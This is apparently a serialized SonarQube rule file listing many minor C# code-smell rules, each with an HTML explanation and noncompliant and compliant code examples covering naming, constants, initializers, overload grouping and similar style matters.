  doSomethingElse();
}
</pre>Z
CODE_SMELL
‹
csharpsquid:S3962∆
csharpsquidS39625"static readonly" constants should be "const" instead"MINOR*cs:·<p>The value of a <code>static readonly</code> field is computed at runtime while the value of a <code>const</code> field is calculated at compile
time, which improves performance.</p>
<p>This rule raises an issue when a <code>static readonly</code> field is initialized with a value that is computable at compile time.</p>
<p>As specified by Microsoft, the list of types that can have a constant value are:</p>
<table>
  <tbody>
    <tr>
      <th>C# type</th>
      <th>.Net Fwk type</th>
    </tr>
    <tr>
      <td>bool</td>
      <td>System.Boolean</td>
    </tr>
    <tr>
      <td>byte</td>
      <td>System.Byte</td>
    </tr>
    <tr>
      <td>sbyte</td>
      <td>System.SByte</td>
    </tr>
    <tr>
      <td>char</td>
      <td>System.Char</td>
    </tr>
    <tr>
      <td>decimal</td>
      <td>System.Decimal</td>
    </tr>
    <tr>
      <td>double</td>
      <td>System.Double</td>
    </tr>
    <tr>
      <td>float</td>
      <td>System.Single</td>
    </tr>
    <tr>
      <td>int</td>
      <td>System.Int32</td>
    </tr>
    <tr>
      <td>uint</td>
      <td>System.UInt32</td>
    </tr>
    <tr>
      <td>long</td>
      <td>System.Int64</td>
    </tr>
    <tr>
      <td>ulong</td>
      <td>System.UInt64</td>
    </tr>
    <tr>
      <td>short</td>
      <td>System.Int16</td>
    </tr>
    <tr>
      <td>ushort</td>
      <td>System.UInt16</td>
    </tr>
    <tr>
      <td>string</td>
      <td>System.String</td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
namespace myLib
{
  public class Foo
  {
    static readonly int x = 1;  // Noncompliant
    static readonly int y = x + 4; // Noncompliant
    static readonly string s = "Bar";  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace myLib
{
  public class Foo
  {
    const int x = 1;
    const int y = x + 4;
    const string s = "Bar";
  }
}
</pre>Z
CODE_SMELL
Í
csharpsquid:S4136‘
csharpsquidS4136+Method overloads should be grouped together"MINOR*cs:˘<p>For clarity, all overloads of the same method should be grouped together. That lets both users and maintainers quickly understand all the current
available options.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface IMyInterface
{
  int DoTheThing(); // Noncompliant - overloaded method declarations are not grouped together
  string DoTheOtherThing();
  int DoTheThing(string s);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
interface IMyInterface
{
  int DoTheThing();
  int DoTheThing(string s);
  string DoTheOtherThing();
}
</pre>
<h2>Exceptions</h2>
<p>As it is also a common practice to group method declarations by accessibility level, no issue will be raised for method overloads having different
access modifiers.</p>
<p>Example:</p>
<pre>
class MyClass
{
  private void DoTheThing(string s) // Ok - this method is declared as private while the other one is public
  {
    // ...
  }

  private string DoTheOtherThing(string s)
  {
    // ...
  }

  public void DoTheThing()
  {
    // ...
  }
}
</pre>Z
CODE_SMELL
“
csharpsquid:S3967º
csharpsquidS3967*Multidimensional arrays should not be used"MINOR*cs:‚<p>A jagged array is an array whose elements are arrays. It is recommended over a multidimensional array because the arrays that make up the elements
can be of different sizes, which avoids wasting memory space.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int [,] myArray =  // Noncompliant
    {
        {1,2,3,4},
        {5,6,7,0},
        {8,0,0,0},
        {9,0,0,0}
    };
// ...
myArray[1,1] = 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
int[][] myArray =
    {
        new int[] {1,2,3,4},
        new int[] {5,6,7},
        new int[] {8},
        new int[] {9}
    };
// ...
myArray[1][1] = 0;
</pre>Z
CODE_SMELL
˘
csharpsquid:S3604„
csharpsquidS36041Member initializer values should not be redundant"MINOR*cs:Ç<p>Fields, properties and events can be initialized either inline or in the constructor. Initializing them inline and in the constructor at the same
time is redundant; the inline initialization will be overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Person
{
  int age = 42; // Noncompliant
  public Person(int age)
  {
    this.age = age;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Person
{
  int age;
  public Person(int age)
  {
    this.age = age;
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't report an issue if not all constructors initialize the field. If the field is initialized inline to its default value, then
<a href='/coding_rules#rule_key=csharpsquid%3AS3052'>S3052</a> already reports an issue on the initialization. </p>Z
CODE_SMELL
ê
csharpsquid:S113˚
csharpsquidS1130Files should contain an empty newline at the end"MINOR*cs:ú<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test
+{
+}
\ No newline at end of file
</pre>Z
CODE_SMELL
ƒ
csharpsquid:S4226Æ
csharpsquidS4226+Extensions should be in separate namespaces"MINOR*cs:”<p>It makes little sense to create an extension method when it is possible to just add that method to the class itself.</p>
<p>This rule raises an issue when an extension is declared in the same namespace as the class it is extending.</p>
<h2>Noncompliant Code Example</h2>
<pre>
namespace MyLibrary
{
    public class Foo
    {
        // ...
    }

    public static class MyExtensions
    {
        public static void Bar(this Foo a) // Noncompliant
        {
            // ...
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<p>Using separate namespace:</p>
<pre>
namespace MyLibrary
{
    public class Foo
    {
        // ...
    }
}

namespace Helpers
{
    public static class MyExtensions
    {
        public void Bar()
        {
            // ...
        }
    }
}
</pre>
<p>Merging the method in the class:</p>
<pre>
namespace MyLibrary
{
    public class Foo
    {
        // ...
        public void Bar()
        {
            // ...
        }
    }
}
</pre>Z
CODE_SMELL
Ó
csharpsquid:S4225ÿ
csharpsquidS4225,Extension methods should not extend "object""MINOR*cs:¸<p>Creating an extension method that extends <code>object</code> is not recommended because it makes the method available on <em>every</em> type.
Extensions should be applied at the most specialized level possible, and that is very unlikely to be <code>object</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    public static class MyExtensions
    {
        public static void Foo(this object o)  //Noncompliant
        {
            // ...
        }
    }
}
</pre>Z
CODE_SMELL
ç
csharpsquid:S3257˜
csharpsquidS3257ADeclarations and initializations should be as concise as possible"MINOR*cs:Ü<p>Unnecessarily verbose declarations and initializations make it harder to read the code, and should be simplified.</p>
<p>Specifically the following should be omitted when they can be inferred:</p>
<ul>
  <li> array element type </li>
  <li> array size </li>
  <li> <code>new DelegateType</code> </li>
  <li> <code>new Nullable&lt;Type&gt;</code> </li>
  <li> object or collection initializers (<code>{}</code>) </li>
  <li> type of lambda expression parameters </li>
  <li> parameter declarations of anonymous methods when the parameters are not used. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var l = new List&lt;int&gt;() {}; // Noncompliant, {} can be removed
var o = new object() {}; // Noncompliant, {} can be removed

var ints = new int[] {1, 2, 3}; // Noncompliant, int can be omitted
ints = new int[3] {1, 2, 3}; // Noncompliant, the size specification can be removed

int? i = new int?(5); // Noncompliant new int? could be omitted, it can be inferred from the declaration, and there's implicit conversion from T to T?
var j = new int?(5);

Func&lt;int, int&gt; f1 = (int i) =&gt; 1; //Noncompliant, can be simplified

class Class
{
    private event EventHandler MyEvent;

    public Class()
    {
        MyEvent += new EventHandler((a,b)=&gt;{ }); // Noncompliant, needlessly verbose
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var l = new List&lt;int&gt;();
var o = new object();

var ints = new [] {1, 2, 3};
ints = new [] {1, 2, 3};

int? i = 5;
var j = new int?(5);

Func&lt;int, int&gt; f1 = (i) =&gt; 1;

class Class
{
    private event EventHandler MyEvent;

    public Class()
    {
        MyEvent += (a,b)=&gt;{ };
    }
}
</pre>Z
CODE_SMELL
Ó
csharpsquid:S1199ÿ
csharpsquidS1199%Nested code blocks should not be used"MINOR*cs:É<p>Nested code blocks can be used to create a new scope and restrict the visibility of the variables defined inside it. Using this feature in a method
typically indicates that the method has too many responsibilities, and should be refactored into smaller methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void Evaluate()
{
    /* ... */
    {     // Noncompliant - nested code block '{' ... '}'
          int a = stack.pop();
          int b = stack.pop();
          int result = a + b;
          stack.push(result);
    }
    /* ... */
}

</pre>
<h2>Compliant Solution</h2>
<pre>
public void Evaluate()
{
    /* ... */
    StackAdd();
    /* ... */
}

private void StackAdd()
{
      int a = stack.pop();
      int b = stack.pop();
      int result = a + b;
      stack.push(result);
}
</pre>
<h2>Exceptions</h2>
<p>The usage of a code block after a "case" is allowed for this rule.</p>Z
CODE_SMELL
ó	
csharpsquid:S3376Å	
csharpsquidS3376VAttribute, EventArgs, and Exception type names should end with the type being extended"MINOR*cs:˚<p>Adherence to the standard naming conventions makes your code not only more readable, but more usable. For instance, <code>class FirstAttribute :
Attribute</code> can be used simply with <code>First</code>, but you must use the full name for <code>class AttributeOne : Attribute</code>.</p>
<p>This rule raises an issue when classes extending <code>Attribute</code>, <code>EventArgs</code>, or <code>Exception</code>, do not end with their
parent class names.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class AttributeOne : Attribute  // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class FirstAttribute : Attribute
{
}
</pre>
<h2>Exceptions</h2>
<p>If a class' direct base class doesn't follow the convention, then no issue is reported on the class itself, regardless of whether or not it
conforms to the convention.</p>
<pre>
class Timeout : Exception // Noncompliant
{
}
class ExtendedTimeout : Timeout // Ignored; doesn't conform to convention, but the direct base doesn't conform either
{
}
</pre>Z
CODE_SMELL
Á
csharpsquid:S3253—
csharpsquidS3253?Constructor and destructor declarations should not be redundant"MINOR*cs:‚<p>Since the compiler will automatically invoke the base type's no-argument constructor, there's no need to specify its invocation explicitly. Also,
when only a single <code>public</code> parameterless constructor is defined in a class, then that constructor can be removed because the compiler
would generate it automatically. Similarly, empty <code>static</code> constructors and empty destructors are also wasted keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class X
{
  public X() { } // Noncompliant
  static X() { }  // Noncompliant
  ~X() { } // Noncompliant

  ...
}

class Y : X
{
  public Y(int parameter) : base() // Noncompliant
  {
    /* does something with the parameter */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class X
{
  ...
}

class Y : X
{
  public Y(int parameter)
  {
    /* does something with the parameter */
  }
}
</pre>Z
CODE_SMELL
é
csharpsquid:S3256¯
csharpsquidS3256%"string.IsNullOrEmpty" should be used"MINOR*cs:£<p>Using <code>string.Equals</code> to determine if a string is empty is significantly slower than using <code>string.IsNullOrEmpty()</code> or
checking for <code>string.Length == 0</code>. <code>string.IsNullOrEmpty()</code> is both clear and concise, and therefore preferred to laborious,
error-prone, manual null- and emptiness-checking.</p>
<h2>Noncompliant Code Example</h2>
<pre>
"".Equals(name); // Noncompliant
!name.Equals(""); // Noncompliant
name.Equals(string.Empty); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
name != null &amp;&amp; name.Length &gt; 0 // Compliant but more error prone
!string.IsNullOrEmpty(name)
string.IsNullOrEmpty(name)
</pre>Z
CODE_SMELL
ö
csharpsquid:S1075Ñ
csharpsquidS1075URIs should not be hardcoded"MINOR*cs:∏<p>Hardcoding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hardcoded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hardcoded.</p>
<p>This rule raises an issue when URI's or path delimiters are hardcoded.</p>
<h2>Exceptions</h2>
<p>This rule does not raise an issue when an ASP.NET virtual path is passed as an argument to one of the following:</p>
<ul>
  <li> methods: <code>System.Web.HttpServerUtilityBase.MapPath()</code>, <code>System.Web.HttpRequestBase.MapPath()</code>,
  <code>System.Web.HttpResponseBase.ApplyAppPathModifier()</code>, <code>System.Web.Mvc.UrlHelper.Content()</code> </li>
  <li> all methods of: <code>System.Web.VirtualPathUtility</code> </li>
  <li> constructors of: <code>Microsoft.AspNetCore.Mvc.VirtualFileResult</code>, <code>Microsoft.AspNetCore.Routing.VirtualPathData</code> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>Z
CODE_SMELL
‘
csharpsquid:S3254æ
csharpsquidS3254:Default parameter values should not be passed as arguments"MINOR*cs:‘<p>Specifying the default parameter values in a method call is redundant. Such values should be omitted in the interests of readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void M(int x, int y=5, int z = 7) { /* ... */ }

// ...
M(1, 5); //Noncompliant, y has the default value
M(1, z: 7); //Noncompliant, z has the default value
</pre>
<h2>Compliant Solution</h2>
<pre>
public void M(int x, int y=5, int z = 7) { /* ... */ }

// ...
M(1);
M(1);
</pre>Z
CODE_SMELL
≤
csharpsquid:S3251ú
csharpsquidS32518Implementations should be provided for "partial" methods"MINOR*cs:¥<p><code>partial</code> methods allow an increased degree of flexibility in programming a system. Hooks can be added to generated code by invoking
methods that define their signature, but might not have an implementation yet. But if the implementation is still missing when the code makes it to
production, the compiler silently removes the call. In the best case scenario, such calls simply represent cruft, but in they worst case they are
critical, missing functionality, the loss of which will lead to unexpected results at runtime.</p>
<p>This rule raises an issue for partial methods for which no implementation can be found in the assembly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
partial class C
{
  partial void M(); //Noncompliant

  void OtherM()
  {
    M(); //Noncompliant. Will be removed.
  }
}
</pre>Z
CODE_SMELL
î	
csharpsquid:S1192˛
csharpsquidS1192(String literals should not be duplicated"MINOR*cs:¶<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
    private string name = "foobar"; // Noncompliant

    public string DefaultName { get; } = "foobar"; // Noncompliant

    public Foo(string value = "foobar") // Noncompliant
    {
        var something = value ?? "foobar"; // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
    private const string Foobar = "foobar";

    private string name = Foobar;

    public string DefaultName { get; } = Foobar;

    public Foo(string value = Foobar)
    {
        var something = value ?? Foobar;
    }
}
</pre>
<h2>Exceptions</h2>
<p>The following are ignored:</p>
<ul>
  <li> literals with fewer than 5 characters </li>
  <li> literals matching one of the parameter names </li>
  <li> literals used in attributes </li>
</ul>Z
CODE_SMELL
Ô
csharpsquid:S1643Ÿ
csharpsquidS16436Strings should not be concatenated using '+' in a loop"MINOR*cs:Û<p><code>StringBuilder</code> is more efficient than string concatenation, especially when the operator is repeated over and over as in loops.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string str = "";
for (int i = 0; i &lt; arrayOfStrings.Length ; ++i)
{
  str = str + arrayOfStrings[i];
}
</pre>
<h2>Compliant Solution</h2>
<pre>
StringBuilder bld = new StringBuilder();
for (int i = 0; i &lt; arrayOfStrings.Length; ++i)
{
  bld.Append(arrayOfStrings[i]);
}
string str = bld.ToString();
</pre>Z
CODE_SMELL
‡

csharpsquid:S101À

csharpsquidS101#Types should be named in PascalCase"MINOR*cs:˘	<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks whether or not type names are using PascalCase. To reduce noise,
two consecutive upper case characters are allowed unless they form the whole type name. So, <code>MyXClass</code> is compliant, but <code>XC</code> on
its own is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class my_class {...}
class SOMEName42 {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
class SomeName42 {...}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> The rule ignores types that are marked with <code>ComImportAttribute</code> or <code>InterfaceTypeAttribute</code>. </li>
  <li> The rule allows for two-letter acronyms in which both letters are capitalized, as shown in the following identifier: <code>IOStream</code>
  </li>
  <li> The rule allows having <code>'_'</code> characters in class names inside test projects. </li>
</ul>
<pre>
class Some_Name___42 {...} // valid in test
class Some_name___42 {...} // still not valid
class Some_Name_XC {...} // invalid because of XC, should be Some_Name_Xc
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.microsoft.com/en-us/dotnet/standard/design-guidelines/capitalization-conventions">Microsoft Capitalization
  Conventions</a> </li>
</ul>Z
CODE_SMELL
Ú

csharpsquid:S100›

csharpsquidS1004Methods and properties should be named in PascalCase"MINOR*cs:˙	<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks whether or not method and property names are PascalCased. To
reduce noise, two consecutive upper case characters are allowed unless they form the whole name. So, <code>MyXMethod</code> is compliant, but
<code>XM</code> on its own is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int doSomething() {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int DoSomething() {...}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> The rule ignores members in types that are marked with <code>ComImportAttribute</code> or <code>InterfaceTypeAttribute</code>. </li>
  <li> The rule ignores <code>extern</code> methods. </li>
  <li> The rule allows for two-letter acronyms in which both letters are capitalized, as shown in the following identifier:
  <code>ExecuteOnUIThread</code>. </li>
  <li> Furthermore, when <code>'_'</code> character is found in a name, the camel casing is not enforced. </li>
</ul>
<pre>
void My_method(){...} // valid
void My_method_(){...} // invalid, leading and trailing underscores are reported
</pre>
<h2>See</h2>
<p><a href="https://docs.microsoft.com/en-us/dotnet/standard/design-guidelines/capitalization-conventions">Microsoft Capitalization
Conventions</a></p>Z
CODE_SMELL
ﬂ

csharpsquid:S2737…

csharpsquidS2737+"catch" clauses should do more than rethrow"MINOR*cs:Ó	<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string s = "";
try
{
  s = File.ReadAllText(fileName);
}
catch (Exception e)  // Noncompliant
{
  throw;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
string s = "";
try
{
  s = File.ReadAllText(fileName);
}
catch (Exception e) // Compliant
{
  logger.LogError(e);
  throw;
}
</pre>
<p>or</p>
<pre>
string s = File.ReadAllText(fileName);
</pre>
<h2>Exceptions</h2>
<p>This rule will not generate issues for <code>catch</code> blocks with just <code>throw</code> inside if they are followed by a <code>catch</code>
block for a more general exception type that does more than just rethrowing the exception.</p>
<pre>
var s = ""
try
{
    s = File.ReadAllText(fileName);
}
catch (IOException) // Compliant, if removed will change the logic
{
    throw;
}
catch (Exception)  // Compliant, does more than just rethrow
{
    logger.LogError(e);
    throw;
}
</pre>Z
CODE_SMELL
…
csharpsquid:S2292≥
csharpsquidS2292-Trivial properties should be auto-implemented"MINOR*cs:÷<p>Trivial properties, which include no logic but setting and getting a backing field should be converted to auto-implemented properties, yielding
cleaner and more readable code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Car
{
  private string _make;
  public string Make // Noncompliant
  {
    get { return _make; }
    set { _make = value; }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Car
{
  public string Make { get; set; }
}
</pre>Z
CODE_SMELL
ï
csharpsquid:S3261ˇ
csharpsquidS3261Namespaces should not be empty"MINOR*cs:±<p>Namespaces with no lines of code clutter a project and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
namespace MyEmptyNamespace // Noncompliant
{

}
</pre>Z
CODE_SMELL
ç
csharpsquid:S1698˜
csharpsquidS16983"==" should not be used when "Equals" is overridden"MINOR*cs:î<p>Using the equality <code>==</code> and inequality <code>!=</code> operators to compare two objects generally works. The operators can be
overloaded, and therefore the comparison can resolve to the appropriate method. However, when the operators are used on interface instances, then
<code>==</code> resolves to reference equality, which may result in unexpected behavior if implementing classes override <code>Equals</code>.
Similarly, when a class overrides <code>Equals</code>, but instances are compared with non-overloaded <code>==</code>, there is a high chance that
value comparison was meant instead of the reference one.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface IMyInterface
{
}

public class MyClass : IMyInterface
{
    public override bool Equals(object obj)
    {
        //...
    }
}

public class Program
{
    public static void Method(IMyInterface instance1, IMyInterface instance2)
    {
        if (instance1 == instance2) // Noncompliant, will do reference equality check, but was that intended? MyClass overrides Equals.
        {
            Console.WriteLine("Equal");
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface IMyInterface
{
}

public class MyClass : IMyInterface
{
    public override bool Equals(object obj)
    {
        //...
    }
}

public class Program
{
    public static void Method(IMyInterface instance1, IMyInterface instance2)
    {
        if (object.Equals(instance1, instance2)) // object.Equals checks for null and then calls the instance based Equals, so MyClass.Equals
        {
            Console.WriteLine("Equal");
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>The rule does not report on comparisons of <code>System.Type</code> instances and on comparisons inside <code>Equals</code> overrides.</p>
<p>It also does not raise an issue when one of the operands is <code>null</code> nor when one of the operand is cast to <code>object</code> (because
in this case we want to ensure reference equality even if some <code>==</code> overload is present).</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/595.html">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/597.html">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wwD1AQ">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of
  boxed primitives </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/8AEqAQ">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference
  equality </li>
</ul>Z
CODE_SMELL
–
csharpsquid:S3876∫
csharpsquidS38765Strings or integral types should be used for indexers"MINOR*cs:’<p>Strings and integral types are typically used as indexers. When some other type is required, it typically indicates design problems, and
potentially a situation where a method should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int this[MyCustomClass index]  // Noncompliant
{
    // get and set accessors
}
</pre>Z
CODE_SMELL
Ë	
csharpsquid:S4049“	
csharpsquidS4049Properties should be preferred"MINOR*cs:Ñ	<p>Properties are accessed like fields which makes them easier to use.</p>
<p>This rule raises an issue when the name of a <code>public</code> or <code>protected</code> method starts with <code>Get</code>, takes no parameter,
and returns a value that is not an array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        private string name;

        public string GetName()  // Noncompliant
        {
            return name;
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        private string name;

        public string Name
        {
            get
            {
                return name;
            }
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>The rule doesn't raise an issue when the method:</p>
<ul>
  <li> Is a constructor </li>
  <li> Is an <code>override</code> </li>
  <li> Is an interface implementation </li>
  <li> Is <code>async</code> </li>
  <li> Returns <code>Task</code>, <code>Task&lt;T&gt;</code> </li>
  <li> Is named <code>GetEnumerator</code>, <code>GetAwaiter</code> </li>
</ul>Z
CODE_SMELL
∂
csharpsquid:S4047†
csharpsquidS4047(Generics should be used when appropriate"MINOR*cs:»<p>When a reference parameter (keyword <code>ref</code>) is used, the passed argument type must exactly match the reference parameter type. This means
that to be able to pass a derived type, it must be cast and assigned to a variable of the proper type. Use of generic methods eliminates that
cumbersome down casting and should therefore be preferred.</p>
<p>This rule raises an issue when a method contains a <code>ref</code> parameter of type <code>System.Object</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo
  {
    public void Bar(ref object o1, ref object o2) // Noncompliant
    {
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo
  {
    public void Bar&lt;T&gt;(ref T ref1, ref T ref2)
    {
    }
  }
}
</pre>Z
CODE_SMELL
˛
csharpsquid:S1210Ë
csharpsquidS1210Z"Equals" and the comparison operators should be overridden when implementing "IComparable""MINOR*cs:ﬁ<p>When you implement <code>IComparable</code> or <code>IComparable&lt;T&gt;</code> on a class you should also override <code>Equals(object)</code>
and overload the comparison operators (<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>,
<code>&gt;=</code>). That's because the CLR cannot automatically call your <code>CompareTo</code> implementation from <code>Equals(object)</code> or
from the base comparison operator implementations. Additionally, it is best practice to override <code>GetHashCode</code> along with
<code>Equals</code>.</p>
<p>This rule raises an issue when a class implements <code>IComparable</code> without also overriding <code>Equals(object)</code> and the comparison
operators.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo: IComparable  // Noncompliant
{
  public int CompareTo(object obj) { /* ... */ }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo: IComparable
{
  public int CompareTo(object obj) { /* ... */ }
  public override bool Equals(object obj)
  {
    var other = obj as Foo;
    if (object.ReferenceEquals(other, null))
    {
      return false;
    }
    return this.CompareTo(other) == 0;
  }
  public int GetHashCode() { /* ... */ }
  public static bool operator == (Foo left, Foo right)
  {
    if (object.ReferenceEquals(left, null))
    {
      return object.ReferenceEquals(right, null);
    }
    return left.Equals(right);
  }
  public static bool operator &gt; (Foo left, Foo right)
  {
    return Compare(left, right) &gt; 0;
  }
  public static bool operator &lt; (Foo left, Foo right)
  {
    return Compare(left, right) &lt; 0;
  }
  public static bool operator != (Foo left, Foo right)
  {
    return !(left == right);
  }
}
</pre>Z
CODE_SMELL
í
csharpsquid:S1694¸
csharpsquidS1694@An abstract class should have both abstract and concrete methods"MINOR*cs:å<p>The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be implemented by sub-classes.</p>
<p>A <code>class</code> with no abstract methods that was made <code>abstract</code> purely to prevent instantiation should be converted to a concrete
<code>class</code> (i.e. remove the <code>abstract</code> keyword) with a <code>protected</code> constructor.</p>
<p>A <code>class</code> with only <code>abstract</code> methods and no inheritable behavior should be converted to an <code>interface</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public abstract class Animal //Noncompliant; should be an interface
{
  abstract void Move();
  abstract void Feed();
}

public abstract class Color //Noncompliant; should be concrete with a private constructor
{
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  public int GetRed()
  {
    return red;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Animal
{
  void Move();
  void Feed();
}

public class Color
{
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  protected Color()
  {}

  public int GetRed()
  {
    return red;
  }
}

public abstract class Lamp
{
  private bool switchLamp = false;

  public abstract void Glow();

  public void FlipSwitch()
  {
    switchLamp = !switchLamp;
    if (switchLamp)
    {
      Glow();
    }
  }
}
</pre>Z
CODE_SMELL
∫
csharpsquid:S3872§
csharpsquidS3872?Parameter names should not duplicate the names of their methods"MINOR*cs:µ<p>The name of a method should communicate what it does, and the names of its parameters should indicate how they're used. If a method and its
parameter have the same name it is an indication that one of these rules of thumb has been broken, if not both. Even if by some trick of language
that's not the case, it is still likely to confuse callers and maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void Login(string login)  // Noncompliant
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void Login(string userName)
{
  //...
}
</pre>Z
CODE_SMELL
û
csharpsquid:S1450à
csharpsquidS1450TPrivate fields only used as local variables in methods should become local variables"MINOR*cs:Ñ<p>When the value of a private field is always assigned to in a class' methods before being read, then it is not being used to store class
information. Therefore, it should become a local variable in the relevant methods to prevent any misunderstanding.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  private int singularField;

  public void DoSomething(int x)
  {
    singularField = x + 5;

    if (singularField == 0) { /* ... */ }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  public void DoSomething(int x)
  {
    int localVariable = x + 5;

    if (localVariable == 0) { /* ... */ }
  }
}
</pre>Z
CODE_SMELL
Û
csharpsquid:S4040›
csharpsquidS4040)Strings should be normalized to uppercase"MINOR*cs:Ñ<p>Certain characters, once normalized to lowercase, cannot make a round trip. That is, they can not be converted from one locale to another and then
accurately restored to their original characters.</p>
<p>It is therefore strongly recommended to normalize characters and strings to uppercase instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Thread.CurrentThread.CurrentCulture = new CultureInfo("tr-TR");
var areStringEqual = "INTEGER".ToLower() == "integer"; // Noncompliant, the result is false as the ToLower will resolve to "ƒ±nteger"
var areCharEqual = char.ToLower('I') == 'i'; // Noncompliant, the result is false as the ToLower will resolve to "ƒ±"

var incorrectRoundtrip = "ƒ∞".ToLowerInvariant().ToUpper() == "I".ToLowerInvariant().ToUpper(); // Noncompliant, because of the lower we lose the information about the correct uppercase character
</pre>
<h2>Compliant Solution</h2>
<pre>
Thread.CurrentThread.CurrentCulture = new CultureInfo("tr-TR");
var areStringEqual = "ƒ±nteger".ToUpperInvariant() == "ƒ±NTEGER";
var areCharEqual = char.ToUpperInvariant('ƒ±') == 'ƒ±';
var correctRoundtrip = "ƒ∞".ToUpperInvariant().ToLower() != "I".ToUpperInvariant().ToLower();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://www.i18nguy.com/unicode/turkish-i18n.html">Internationalization for Turkish</a> </li>
  <li> <a href="https://gingter.org/2018/07/10/how-to-correctly-normalize-strings-and-how-to-compare-them-in-net/">How to correctly normalize
  strings</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/best-practices-strings#recommendations-for-string-usage">Best Practices
  for Using Strings in .NET</a> </li>
</ul>Z
CODE_SMELL
ˆ
csharpsquid:S4041‡
csharpsquidS4041&Type names should not match namespaces"MINOR*cs:ä<p>When a type name matches the name of a publicly defined namespace, for instance one in the .NET framework class library, it leads to confusion and
makes the library that much harder to use.</p>
<p>This rule raises an issue when a name of a public type matches the name of a .NET Framework namespace, or a namespace of the project assembly, in a
case-insensitive comparison.</p>
